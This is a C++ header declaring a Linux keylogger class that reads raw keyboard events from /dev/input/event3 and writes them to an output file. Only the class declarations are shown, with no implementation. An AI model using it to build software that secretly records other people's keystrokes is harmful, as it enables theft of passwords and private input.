#ifndef _KEYLOG_HH_
#define _KEYLOG_HH_

#include "fileWriter.hh"
#include <algorithm>
#include <fcntl.h>
#include <linux/input.h>
#include <signal.h>
#include <sstream>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define INPUT_DEVICE "/dev/input/event3"

class Keylog
{
	public:
		Keylog(const char* file, bool verbose);
		~Keylog();
		void run();
		void shutdown();

	private:
		FileWriter* fileOutput;
		bool writer;
		bool verbose;
		int inputFd;
		int getIndex(unsigned short &code, int* values, int size);
		string getInputNode();
};

#endif
